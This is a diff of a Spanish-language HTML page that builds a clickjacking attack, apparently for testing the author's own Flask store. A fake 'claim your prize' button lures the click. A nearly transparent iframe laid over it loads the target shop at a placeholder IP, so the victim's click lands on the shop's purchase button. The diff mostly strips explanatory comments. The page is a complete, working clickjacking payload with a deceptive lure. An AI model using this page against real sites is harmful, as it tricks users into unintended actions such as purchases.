@@ -10,7 +10,7 @@
             padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer;
             position: relative; z-index: 10; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        /* El iframe invisible que carga tu tienda real de fondo */
+        
         .trampa-iframe {
             position: absolute;
             top: 200px;
@@ -18,7 +18,7 @@
             transform: translateX(-50%);
             width: 800px;
             height: 600px;
-            opacity: 0.1; /* <--- Ponlo en 0.5 o 0.8 para ver tu tienda tras el diseño trampa */
+            opacity: 0.1; 
             z-index: 20;
             border: 2px dashed red;
         }
@@ -29,14 +29,14 @@
     <h1>🎉 ¡Felicidades! Has sido seleccionado para ganar un premio</h1>
     <p>Haz clic en el botón verde para reclamar tu regalo de inmediato:</p>
 
-    <!-- Botón falso de anzuelo -->
+    
     <button class="btn-premio">¡RECLAMAR PREMIO AHORA!</button>
 
     <p style="margin-top: 150px; color: gray; font-size: 12px;">Sitio patrocinado por promociones falsas de prueba.</p>
 
     <!-- AQUÍ ESTÁ EL ATAQUE: Cargamos tu tienda Flask dentro de la página del atacante -->
-    <!-- Si estuvieras logueado o con una sesión activa, el botón de "Comprar" coincidiría con el botón falso -->
-    <iframe src="http://192.168.0.11:5050/" class="trampa-iframe"></iframe>
+    <!-- Cambia a tu direccion IP -->
+    <iframe src="http://X.X.X.X:5050/" class="trampa-iframe"></iframe>
 
 </body>
 </html>
